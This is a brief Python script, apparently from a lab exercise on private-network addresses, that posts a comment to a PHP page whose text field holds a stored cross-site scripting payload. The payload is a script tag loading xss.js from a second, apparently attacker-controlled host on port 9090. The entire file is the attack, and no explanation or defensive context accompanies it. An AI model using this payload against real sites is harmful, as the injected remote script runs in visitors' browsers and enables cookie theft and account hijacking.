import requests


uri= "http://172.16.113.150/post_comment.php?id=2"
payload ={'title':'Confuse', 'author':'nyanyi','text':'<script src="http://172.16.113.48:9090/xss.js"></script>','submit':'submit'}
r=requests.post(uri, data=payload)
print(r.url)
